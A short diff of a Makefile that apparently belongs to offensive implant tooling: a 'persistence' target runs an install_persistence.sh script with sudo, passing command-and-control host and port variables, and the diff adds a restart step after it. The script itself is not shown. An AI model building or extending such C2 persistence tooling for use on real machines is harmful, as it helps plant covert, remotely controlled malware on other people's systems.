@@ -15,6 +15,7 @@ clean:
 
 persistence install-persistence: modules
 	sudo ./install_persistence.sh $(C2_IP) $(C2_PORT)
+	$(MAKE) restart
 
 start:
 	sudo systemctl start $(SERVICE)
